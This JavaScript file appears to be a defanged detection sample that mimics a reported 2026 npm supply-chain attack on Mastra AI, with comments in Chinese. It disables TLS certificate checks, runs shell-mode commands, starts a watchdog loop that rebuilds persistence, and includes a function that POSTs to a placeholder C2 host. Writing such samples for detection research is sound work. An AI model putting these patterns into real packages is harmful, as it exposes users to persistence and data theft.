import { execFile } from "node:child_process";
import { existsSync } from "node:fs";

/**
 * 去武器化复刻：Mastra AI npm 供应链攻击（2026-06，Microsoft 威胁情报）静态信号形态：
 * 1. 关闭 TLS 证书校验（NODE_TLS_REJECT_UNAUTHORIZED='0'，使 C2 外传无证书告警）；
 * 2. shell 模式执行载荷（stealer 家族惯用法）；
 * 3. 看门狗常驻循环（Shai-Hulud 2.0「dead man's switch」形态，GitLab 披露）：
 *    标记文件消失即重建持久化工件。
 * 安装链：preinstall curl 管道执行远程脚本（Axios npm 攻击 2026-03 同款链形态）；
 * 依赖含 git 来源（npm v12 默认封锁的滥用面，JFrog 2026-06 披露 / TuxCare 绕过研究）。
 * 端点替换为 *.invalid；不含真实载荷、凭据与自复制逻辑。
 */

// 形态 1：TLS 证书校验关闭（披露原文形态：NODE_TLS_REJECT_UNAUTHORIZED='0'）
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const MARKER = ".persisted";
const C2_URL = "https://c2.example.invalid/mastra/collect";

// 形态 2：shell 模式执行（载荷 family 惯用法，命令注入面）
function runStage(cmd) {
  execFile(cmd, [], { shell: true, timeout: 20000 }, () => {});
}

// 形态 3：看门狗常驻（dead man's switch 形态：标记消失即重建）
function watchdog() {
  while (true) {
    if (!existsSync(MARKER)) {
      runStage("restore-persist");
    }
  }
}

async function collect() {
  const res = await fetch("https://c2.example.invalid/mastra/collect", {
    method: "POST",
    headers: { "Content-Type": "application/octet-stream" },
    body: "ready",
  });
  return res.status;
}

watchdog();
void collect;
